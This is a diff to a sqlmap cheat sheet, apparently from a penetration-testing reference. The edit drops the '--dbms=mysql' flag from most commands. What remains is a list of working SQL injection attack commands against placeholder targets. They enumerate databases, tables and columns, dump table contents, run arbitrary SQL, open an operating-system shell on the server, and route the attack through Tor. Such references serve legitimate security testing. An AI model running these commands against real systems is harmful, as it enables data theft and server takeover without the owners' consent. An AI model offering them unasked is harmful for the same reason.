@@ -4,34 +4,34 @@
 sqlmap -u "$URL" --current-db
 
 # Enumerate databases
-sqlmap --dbms=mysql -u "$URL" --dbs
+sqlmap -u "$URL" --dbs
 
 # Enumerate tables
-sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --tables
+sqlmap -u "$URL" -D "$DATABASE" --tables
 
 # List columns of table target_Table of database target_DB
 sqlmap -u “http://target_server/” -D target_DB -T target_Table --columns
 
 # Dump table data
-sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump
+sqlmap -u "$URL" -D "$DATABASE" -T "$TABLE" --dump
 
 # Specify target DBMS to MySQL
 sqlmap -u "$URL" --dbms=mysql
 
 # Specify parameter to exploit
-sqlmap --dbms=mysql -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2
+sqlmap -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2
 
 # Specify parameter to exploit in 'nice' URIs
-sqlmap --dbms=mysql -u "http://www.example.com/param1/value1*/param2/value2" --dbs # exploits param1
+sqlmap  -u "http://www.example.com/param1/value1*/param2/value2" --dbs # exploits param1
 
 # Get OS shell
-sqlmap --dbms=mysql -u "$URL" --os-shell
+sqlmap -u "$URL" --os-shell
 
 # SQL query
-sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"
+sqlmap -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"
 
 # Use Tor Socks5 proxy
-sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs
+sqlmap --tor --tor-type=SOCKS5 --check-tor -u "$URL" --dbs
 
 # Using a proxy
 sqlmap -u “http://target_server/” --proxy=http://proxy_address:port
